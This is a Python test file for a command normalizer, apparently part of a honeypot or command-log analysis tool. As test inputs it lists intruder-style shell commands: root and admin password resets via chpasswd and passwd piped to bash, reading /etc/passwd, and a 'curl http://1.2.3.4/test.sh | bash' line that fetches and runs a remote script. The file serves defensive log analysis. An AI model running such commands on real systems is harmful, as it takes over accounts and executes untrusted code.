from normalizer import normalize_command


def test_passwd():
    assert normalize_command(
        'echo "123456\\nnewpassword\\nnewpassword" | passwd'
    ) == 'echo "<INPUT>" | passwd'

    assert normalize_command(
        'echo -e "123456\\nnewpassword\\nnewpassword" | passwd'
    ) == 'echo "<INPUT>" | passwd'

    assert normalize_command(
        'echo "anything"|passwd'
    ) == 'echo "<INPUT>" | passwd'


def test_passwd_with_bash():
    assert normalize_command(
        'echo "anything" | passwd | bash'
    ) == 'echo "<INPUT>" | passwd | bash'

    assert normalize_command(
        'echo -e "anything"|passwd|bash'
    ) == 'echo "<INPUT>" | passwd | bash'


def test_chpasswd():
    assert normalize_command(
        'echo "root:SuperSecret123" | chpasswd'
    ) == 'echo "<INPUT>" | chpasswd'

    assert normalize_command(
        'echo "admin:Password123!" | chpasswd'
    ) == 'echo "<INPUT>" | chpasswd'

    assert normalize_command(
        "echo 'user:secret' | chpasswd"
    ) == 'echo "<INPUT>" | chpasswd'


def test_chpasswd_with_bash():
    assert normalize_command(
        'echo "root:SuperSecret123"|chpasswd|bash'
    ) == 'echo "<INPUT>" | chpasswd | bash'


def test_whitespace_normalization():
    assert normalize_command(
        "  uname    -a  "
    ) == "uname -a"

    assert normalize_command(
        "uname\t\t-a"
    ) == "uname -a"

    assert normalize_command(
        "uname\n-a"
    ) == "uname -a"


def test_normal_commands_are_unchanged():
    assert normalize_command("uname -a") == "uname -a"
    assert normalize_command("whoami") == "whoami"
    assert normalize_command("cat /etc/passwd") == "cat /etc/passwd"


def test_normalizer_does_not_sanitize_ips():
    command = "curl http://1.2.3.4/test.sh | bash"

    assert normalize_command(command) == command